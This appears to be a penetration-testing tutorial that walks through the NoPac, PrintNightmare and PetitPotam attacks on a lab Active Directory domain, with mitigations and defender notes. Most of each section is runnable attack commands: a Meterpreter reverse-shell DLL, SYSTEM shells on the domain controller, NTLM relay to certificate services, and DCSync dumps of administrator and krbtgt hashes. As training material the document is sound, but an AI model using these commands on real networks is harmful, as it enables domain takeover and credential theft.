# Bleeding Edge Vulnerabilities in Active Directory Lateral Movement

## Introduction
Many organizations delay patching, leaving them exposed to recent, high-impact vulnerabilities. This section covers three advanced attacks—NoPac, PrintNightmare, and PetitPotam—that can lead to domain compromise. These attacks are powerful, require caution, and should only be tested in lab environments or with explicit client approval.

---

## Scenario Setup
- **Linux attack host:** SSH into ATTACK01.
- **Windows attack host:** Use MS01 for Rubeus/Mimikatz demos.
- All tools and exploits referenced are open-source and available on GitHub.

---

## 1. NoPac (SamAccountName Spoofing)
**CVE-2021-42278 & CVE-2021-42287**

- Allows privilege escalation from any standard domain user to Domain Admin in a single command.
- Exploits the ability to change a computer account's SamAccountName to match a Domain Controller, then requests Kerberos tickets as the DC.
- **Pre-requisite:** ms-DS-MachineAccountQuota > 0 (default: 10).

### Attack Flow
1. **Install Impacket and NoPac:**
    ```bash
    git clone https://github.com/SecureAuthCorp/impacket.git
    cd impacket && python setup.py install
    git clone https://github.com/Ridter/noPac.git
    ```
2. **Scan for Vulnerability:**
    ```bash
    sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
    ```
    - Look for `ms-DS-MachineAccountQuota` and TGT acquisition.
3. **Exploit with noPac.py:**
    ```bash
    sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
    ```
    - Drops a SYSTEM shell on the DC using smbexec.py.
    - TGTs and ccache files are saved locally for further attacks.
4. **DCSync with noPac:**
    ```bash
    sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
    ```
    - Dumps NTLM hashes and Kerberos keys for the administrator.

**OpSec Note:**
- smbexec.py is noisy and may trigger AV/EDR. Avoid on production unless necessary.
- Clean up ccache files and machine accounts after testing.

**Mitigation:**
- Set `ms-DS-MachineAccountQuota` to 0 if possible.
- Patch DCs for CVE-2021-42278/42287.

---

## 2. PrintNightmare (CVE-2021-34527 & CVE-2021-1675)
- Vulnerabilities in the Windows Print Spooler service allow remote code execution and privilege escalation.
- Can be used for local or remote SYSTEM shell access on unpatched hosts.

### Attack Flow
1. **Clone Exploit and Install Impacket:**
    ```bash
    git clone https://github.com/cube0x0/CVE-2021-1675.git
    pip3 uninstall impacket
    git clone https://github.com/cube0x0/impacket
    cd impacket && python3 ./setup.py install
    ```
2. **Check for Print Spooler Exposure:**
    ```bash
    rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
    ```
3. **Generate DLL Payload:**
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
    ```
4. **Host DLL with smbserver.py:**
    ```bash
    sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
    ```
5. **Start MSF multi/handler:**
    ```
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 172.16.5.225
    set LPORT 8080
    run
    ```
6. **Run the Exploit:**
    ```bash
    sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
    ```
    - If successful, a SYSTEM Meterpreter shell is returned.

**Mitigation:**
- Patch all Windows hosts for PrintNightmare CVEs.
- Disable Print Spooler on servers where not needed.

---

## 3. PetitPotam (CVE-2021-36942, MS-EFSRPC)
- LSA spoofing vulnerability allowing NTLM relay to AD CS (Active Directory Certificate Services).
- Can lead to domain compromise by relaying DC authentication to a vulnerable CA.

### Attack Flow
1. **Start ntlmrelayx.py targeting AD CS Web Enrollment:**
    ```bash
    sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
    ```
2. **Trigger authentication from DC with PetitPotam:**
    ```bash
    python3 PetitPotam.py 172.16.5.225 172.16.5.5
    ```
    - Alternatively, use Mimikatz or PowerShell implementations.
3. **Capture and save the base64 certificate blob from ntlmrelayx.py output.**
4. **Request a TGT for the DC using gettgtpkinit.py:**
    ```bash
    python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ -pfx-base64 <base64cert> dc01.ccache
    export KRB5CCNAME=dc01.ccache
    ```
5. **DCSync with secretsdump.py:**
    ```bash
    secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
    ```
6. **Alternative: Use getnthash.py to extract NT hash from TGT:**
    ```bash
    python /opt/PKINITtools/getnthash.py -key <AS-REP-key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
    secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes <lm>:<nt>
    ```
7. **On Windows, use Rubeus to request TGT and perform PTT:**
    ```powershell
    .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64cert> /ptt
    klist
    .\mimikatz.exe "lsadump::dcsync /user:inlanefreight\krbtgt"
    ```

**Mitigation:**
- Patch for CVE-2021-36942.
- Harden AD CS: require SSL, disable NTLM, restrict templates, monitor for relaying.
- See "Certified Pre-Owned" whitepaper for advanced AD CS attack/defense.

---

## Defender Notes
- Patch and harden all DCs, CAs, and print servers.
- Monitor for new machine accounts, suspicious service creation, and certificate requests.
- Restrict who can add computers to the domain (`ms-DS-MachineAccountQuota`).
- Disable unnecessary services (Print Spooler, AD CS Web Enrollment).
- Audit for use of tools like smbexec.py, ntlmrelayx.py, and Rubeus.

---

## Recap
- **NoPac:** Standard user to DA via SamAccountName spoofing.
- **PrintNightmare:** RCE/SYSTEM shell via Print Spooler.
- **PetitPotam:** NTLM relay to AD CS for domain compromise.
- All can lead to full domain compromise with minimal privileges or even unauthenticated access.
- Always test in a lab, keep up with new vulnerabilities, and advise clients on patching and hardening.

---

## References
- [NoPac (SamAccountName Spoofing)](https://github.com/Ridter/noPac)
- [PrintNightmare (cube0x0)](https://github.com/cube0x0/CVE-2021-1675)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [Certified Pre-Owned Whitepaper](https://research.ifcr.dk/certified-pre-owned/) 